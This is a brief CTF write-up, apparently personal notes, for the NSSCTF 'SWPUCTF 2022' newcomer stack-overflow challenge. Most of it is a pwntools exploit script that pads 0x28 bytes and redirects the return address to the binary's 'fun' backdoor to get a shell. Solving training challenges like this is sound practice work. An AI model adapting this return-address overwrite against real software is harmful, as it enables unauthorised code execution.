[[SWPUCTF 2022 新生赛]有手就行的栈溢出 | NSSCTF](https://www.nssctf.cn/problem/2636)
![[Pasted image 20240901115237.png]]
后门函数有gift和fun，可用的是fun，确实是有手就行的栈溢出
exp:
```python
from pwn import *

# p = remote("node5.anna.nssctf.cn", 23017)
p = process('./nss2636')
elf = ELF('./nss2636')

# pwnlib.gdb.attach(p, 'b* 0x4011DD')

overflow = elf.symbols['overflow']
gift = elf.symbols['gift']
fun = elf.symbols['fun']

rdi = 0x401303
ret = 0x40101a

offset = 0x28

payload = b'A' * offset + p64(fun)
p.recvuntil(b"overflows")
p.sendline(payload)

p.interactive()
```